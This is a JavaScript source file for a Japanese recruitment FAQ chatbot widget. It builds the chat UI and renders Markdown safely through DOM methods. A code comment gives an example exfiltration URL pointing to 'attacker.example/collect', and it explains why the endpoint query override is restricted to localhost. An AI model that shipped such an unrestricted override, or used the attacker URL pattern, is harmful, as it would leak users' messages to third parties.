(function () {
  'use strict';

  // Phase A 採用FAQチャットボット (Vertex AI Gemini backend, chatbot/ 参照)。
  // map-search.js と同じ「末尾script + 専用JSモジュール + DOM自己注入」パターン。
  //
  // エンドポイント解決順: (1) このscriptタグの data-endpoint 属性 → (2) 下記デフォルト定数。
  // index.html / jobs.html は明示的に data-endpoint を指定済み。デフォルトは
  // 2026-07-24 デプロイ済みの本番Cloud Run URL (chatbot/README.md 参照) —
  // data-endpoint を付け忘れた新規ページへの展開時のフォールバックとして機能する。
  //
  // ローカル確認用の ?chatbot_endpoint= クエリ上書きは localhost/127.0.0.1 でのみ有効
  // (/code-review high で指摘: 本番オリジンで無制限に許可すると、悪意あるURL
  // `?chatbot_endpoint=https://attacker.example/collect` を踏んだ訪問者の入力メッセージが
  // 攻撃者サーバーへ送信されてしまうデータ流出経路になる)。
  var DEFAULT_ENDPOINT = 'https://aozora-chatbot-1084369586348.asia-northeast1.run.app/chat';
  // chatbot/src/chatbot/config.py の AppConfig.max_history_turns (env
  // MAX_HISTORY_TURNS、既定6) と値が重複している。これは payload サイズを
  // 抑える送信側のヒントに過ぎず、バックエンドの _trim_history が最終的な
  // 上限を独立して再適用するので機能的な結合はない。バックエンド側だけ
  // 変更しても壊れないが、値を大きく変える運用ならこちらも合わせて更新する
  // こと (/code-review high で指摘: 単一情報源になっていない)。
  var MAX_HISTORY_TURNS = 6;
  var LOCAL_HOSTNAMES = ['localhost', '127.0.0.1'];

  // 初回グリーティング直後に出す固定サジェスト (FAQ由来)。2回目以降の応答は
  // バックエンドが質問内容に応じて動的に返す suggestions を使う。
  var STARTER_SUGGESTIONS = [
    '未経験でも応募できますか？',
    '夜勤のない求人はありますか？',
    '選考にはどれくらいかかりますか？',
    '見学だけでも可能ですか？',
  ];

  var currentScript = document.currentScript;

  function resolveEndpoint() {
    if (LOCAL_HOSTNAMES.indexOf(window.location.hostname) !== -1) {
      try {
        var fromQuery = new URLSearchParams(window.location.search).get('chatbot_endpoint');
        if (fromQuery) return fromQuery;
      } catch (e) {
        // URLSearchParams 非対応の古いブラウザ等は無視して次のフォールバックへ。
      }
    }
    if (currentScript && currentScript.getAttribute('data-endpoint')) {
      return currentScript.getAttribute('data-endpoint');
    }
    return DEFAULT_ENDPOINT;
  }

  var ENDPOINT = resolveEndpoint();

  function escapeForLog(str) {
    return String(str).slice(0, 200);
  }

  function el(tag, className, attrs) {
    var node = document.createElement(tag);
    if (className) node.className = className;
    if (attrs) {
      Object.keys(attrs).forEach(function (key) {
        node.setAttribute(key, attrs[key]);
      });
    }
    return node;
  }

  function buildToggleIcon() {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('viewBox', '0 0 24 24');
    svg.setAttribute('fill', 'none');
    svg.setAttribute('aria-hidden', 'true');
    svg.innerHTML =
      '<path d="M4 5.5C4 4.67 4.67 4 5.5 4h13c.83 0 1.5.67 1.5 1.5v10c0 .83-.67 1.5-1.5 1.5H9l-4 4v-4H5.5C4.67 17 4 16.33 4 15.5v-10z" ' +
      'stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/>';
    return svg;
  }

  function buildSendIcon() {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('viewBox', '0 0 24 24');
    svg.setAttribute('fill', 'none');
    svg.setAttribute('aria-hidden', 'true');
    svg.innerHTML =
      '<path d="M4 12l16-7-6.5 16-2.5-6.5L4 12z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round" stroke-linecap="round"/>';
    return svg;
  }

  // ─── bot応答の軽量Markdownレンダリング ─────────────────────────────────
  // system prompt (chatbot/src/chatbot/prompts.py) は **太字** と `- ` 箇条書き
  // のみを許可し、見出し・表・コードブロック・リンク記法は使わせない。ここでは
  // その範囲だけを DOM 生成 (createElement/textContent) で描画する — innerHTML
  // は一切使わないため、応答テキストに HTML タグが含まれていてもテキストとして
  // 表示されるだけで XSS は発火しない。

  var BULLET_LINE = /^\s*[-・]\s+/;
  var BOLD_SPLIT = /(\*\*[^*]+\*\*)/g;
  var BOLD_MATCH = /^\*\*([^*]+)\*\*$/;
  // system prompt でリンク記法は使わせない方針だが、念のため本文中に
  // [text](url) が混じっても url は描画せず text だけ残す (防御的多層防御)。
  var MARKDOWN_LINK = /\[([^\]]+)\]\([^)]*\)/g;

  function appendInlineMarkdown(parent, text) {
    var parts = String(text).split(BOLD_SPLIT);
    parts.forEach(function (part) {
      if (!part) return;
      var m = BOLD_MATCH.exec(part);
      if (m) {
        var strong = document.createElement('strong');
        strong.textContent = m[1];
        parent.appendChild(strong);
      } else {
        parent.appendChild(document.createTextNode(part));
      }
    });
  }

  function renderRichText(container, text) {
    var lines = String(text).replace(MARKDOWN_LINK, '$1').split('\n');
    var i = 0;
    while (i < lines.length) {
      var line = lines[i];
      if (BULLET_LINE.test(line)) {
        var ul = el('ul', 'chat-widget__list');
        while (i < lines.length && BULLET_LINE.test(lines[i])) {
          var li = document.createElement('li');
          appendInlineMarkdown(li, lines[i].replace(BULLET_LINE, ''));
          ul.appendChild(li);
          i++;
        }
        container.appendChild(ul);
        continue;
      }
      if (line.trim() === '') {
        i++;
        continue;
      }
      var p = el('p', 'chat-widget__paragraph');
      appendInlineMarkdown(p, line);
      container.appendChild(p);
      i++;
    }
  }

  function init() {
    var root = el('div', 'chat-widget');

    var toggle = el('button', 'chat-widget__toggle', {
      type: 'button',
      'aria-haspopup': 'dialog',
      'aria-expanded': 'false',
      'aria-label': '採用に関する質問チャットを開く',
    });
    toggle.appendChild(buildToggleIcon());

    var panel = el('div', 'chat-widget__panel', {
      role: 'dialog',
      'aria-modal': 'false',
      'aria-label': '採用FAQチャットボット',
    });
    panel.hidden = true;

    var header = el('div', 'chat-widget__header');
    var headerText = el('div');
    var headerTitle = el('p', 'chat-widget__header-title');
    headerTitle.textContent = '採用FAQチャットボット';
    var headerSub = el('p', 'chat-widget__header-sub');
    headerSub.textContent = '求人に関するご質問にお答えします';
    headerText.appendChild(headerTitle);
    headerText.appendChild(headerSub);
    var closeBtn = el('button', 'chat-widget__close', {
      type: 'button',
      'aria-label': 'チャットを閉じる',
    });
    closeBtn.textContent = '×';
    header.appendChild(headerText);
    header.appendChild(closeBtn);

    var messages = el('div', 'chat-widget__messages', {
      'aria-live': 'polite',
      'aria-atomic': 'false',
    });

    var form = el('form', 'chat-widget__form');
    var textarea = el('textarea', 'chat-widget__input', {
      rows: '1',
      placeholder: 'ご質問を入力してください（例：夜勤なしの求人はありますか？）',
      'aria-label': 'メッセージを入力',
      maxlength: '500',
    });
    var sendBtn = el('button', 'chat-widget__send', {
      type: 'submit',
      'aria-label': '送信',
    });
    sendBtn.appendChild(buildSendIcon());
    form.appendChild(textarea);
    form.appendChild(sendBtn);

    panel.appendChild(header);
    panel.appendChild(messages);
    panel.appendChild(form);

    root.appendChild(panel);
    root.appendChild(toggle);
    document.body.appendChild(root);

    var history = []; // [{role: 'user'|'model', content: string}]
    var sending = false;
    var greeted = false;

    function addMessage(text, kind) {
      var bubble = el('div', 'chat-widget__message chat-widget__message--' + kind);
      if (kind === 'bot') {
        renderRichText(bubble, text); // **太字**/箇条書きのみ対応、DOM生成でXSS対策
      } else {
        bubble.textContent = text; // user/error は常にプレーンテキスト
      }
      messages.appendChild(bubble);
      messages.scrollTop = messages.scrollHeight;
      return bubble;
    }

    function addJobCards(jobs) {
      if (!jobs || !jobs.length) return;
      var wrap = el('div', 'chat-widget__jobs');
      jobs.forEach(function (job) {
        // 求人詳細は別タブで開く — 同タブ遷移だとチャットの会話が失われるため。
        var card = el('a', 'chat-widget__job-card', {
          href: job.url,
          target: '_blank',
          rel: 'noopener',
        });
        var title = el('p', 'chat-widget__job-card-title');
        title.textContent = job.title;
        var meta = el('p', 'chat-widget__job-card-meta');
        meta.textContent =
          job.facility + '（' + job.city + '） ／ ' + job.employment.join('・');
        var cta = el('span', 'chat-widget__job-card-cta');
        cta.textContent = '詳細を見る';
        card.appendChild(title);
        card.appendChild(meta);
        card.appendChild(cta);
        wrap.appendChild(card);
      });
      messages.appendChild(wrap);
      messages.scrollTop = messages.scrollHeight;
    }

    function addSuggestions(suggestions) {
      if (!suggestions || !suggestions.length) return;
      var wrap = el('div', 'chat-widget__suggestions');
      suggestions.forEach(function (text) {
        var chip = el('button', 'chat-widget__chip', { type: 'button' });
        chip.textContent = text;
        chip.addEventListener('click', function () {
          if (sending) return;
          wrap.remove(); // 送信後にこのグループを消し、多重送信を防ぐ
          textarea.value = text;
          form.requestSubmit();
        });
        wrap.appendChild(chip);
      });
      messages.appendChild(wrap);
      messages.scrollTop = messages.scrollHeight;
    }

    function addTypingIndicator() {
      var typing = el('div', 'chat-widget__typing', { 'aria-hidden': 'true' });
      typing.appendChild(document.createElement('span'));
      typing.appendChild(document.createElement('span'));
      typing.appendChild(document.createElement('span'));
      messages.appendChild(typing);
      messages.scrollTop = messages.scrollHeight;
      return typing;
    }

    function openPanel() {
      panel.hidden = false;
      toggle.setAttribute('aria-expanded', 'true');
      if (!greeted) {
        greeted = true;
        addMessage(
          'こんにちは。採用に関するご質問（未経験可否・夜勤の有無・選考期間など）にお答えします。',
          'bot'
        );
        addSuggestions(STARTER_SUGGESTIONS);
      }
      window.requestAnimationFrame(function () {
        textarea.focus();
      });
    }

    function closePanel() {
      panel.hidden = true;
      toggle.setAttribute('aria-expanded', 'false');
    }

    toggle.addEventListener('click', function () {
      if (panel.hidden) openPanel();
      else closePanel();
    });
    closeBtn.addEventListener('click', closePanel);

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && !panel.hidden) {
        closePanel();
        toggle.focus();
      }
    });

    // IME (日本語入力等) の変換中かどうかを追跡する。変換候補を確定するための
    // Enter を送信トリガーとして扱ってしまうと (/code-review 前の実装のバグ)、
    // 意図せずメッセージが送信されてしまう。
    var composing = false;
    // 一部ブラウザ(Safari等)では、変換確定用のEnterに対して compositionend が
    // その Enter の keydown より先に発火し、かつその keydown が isComposing=false・
    // keyCode!==229 で届くことがある (/code-review medium で指摘)。compositionend
    // 直後の Enter を短時間だけ追加で無視するグレース期間を設け、この抜け穴を防ぐ。
    var composingJustEnded = false;
    textarea.addEventListener('compositionstart', function () {
      composing = true;
    });
    textarea.addEventListener('compositionend', function () {
      composing = false;
      composingJustEnded = true;
      window.setTimeout(function () {
        composingJustEnded = false;
      }, 0);
    });

    // Enter で送信、Shift+Enter で改行 (map-search.js 同様プレーンJSのみ)。
    // `e.isComposing` に加えて legacy な `keyCode === 229` も見るのは、IME変換
    // 確定用の Enter を isComposing=false 済みの keydown として送ってくる
    // ブラウザ実装のばらつきに対応するための、広く使われている防御的チェック。
    textarea.addEventListener('keydown', function (e) {
      if (e.key !== 'Enter' || e.shiftKey) return;
      if (composing || composingJustEnded || e.isComposing || e.keyCode === 229) return;
      e.preventDefault();
      form.requestSubmit();
    });

    form.addEventListener('submit', function (e) {
      e.preventDefault();
      if (sending) return;

      var message = textarea.value.trim();
      if (!message) return;

      addMessage(message, 'user');
      textarea.value = '';
      sending = true;
      sendBtn.disabled = true;

      var typing = addTypingIndicator();
      var requestHistory = history.slice(-MAX_HISTORY_TURNS);

      fetch(ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message: message, history: requestHistory }),
      })
        .then(function (res) {
          typing.remove();
          if (res.status === 429) {
            addMessage(
              'ただいま混み合っています。少し時間をおいて再度お試しください。',
              'error'
            );
            return null;
          }
          if (!res.ok) {
            throw new Error('chat request failed: ' + res.status);
          }
          return res.json();
        })
        .then(function (data) {
          if (!data) return; // 429 等で既にエラー表示済み
          // blocked=true (スコープ外/セーフティ拒否) も定型文として bot 吹き出しで表示する
          // — ユーザー視点では「答えられない」という通常の応答の一種であり、見た目を変える
          // 必要はない (エラー扱いにしない)。
          addMessage(data.reply, 'bot');
          addJobCards(data.jobs);
          addSuggestions(data.suggestions);
          history.push({ role: 'user', content: message });
          history.push({ role: 'model', content: data.reply });
          history = history.slice(-MAX_HISTORY_TURNS);
        })
        .catch(function (err) {
          typing.remove();
          addMessage(
            '通信エラーが発生しました。しばらくしてから再度お試しください。',
            'error'
          );
          if (window.console && window.console.warn) {
            window.console.warn('[chat-widget] request failed:', escapeForLog(err));
          }
        })
        .finally(function () {
          sending = false;
          sendBtn.disabled = false;
        });
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
